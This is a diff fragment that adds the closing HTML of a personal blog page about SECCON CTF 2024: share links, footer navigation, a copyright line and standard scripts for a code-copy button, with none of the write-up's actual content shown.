+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://wha13.github.io/2024/12/01/seccon-ctf-2024/&title=SECCON CTF 2024 紀錄"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://wha13.github.io/2024/12/01/seccon-ctf-2024/&title=SECCON CTF 2024 紀錄"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://wha13.github.io/2024/12/01/seccon-ctf-2024/&title=SECCON CTF 2024 紀錄"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://wha13.github.io/2024/12/01/seccon-ctf-2024/&name=SECCON CTF 2024 紀錄&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://wha13.github.io/2024/12/01/seccon-ctf-2024/&t=SECCON CTF 2024 紀錄"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2023-2024
+    William Lin
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
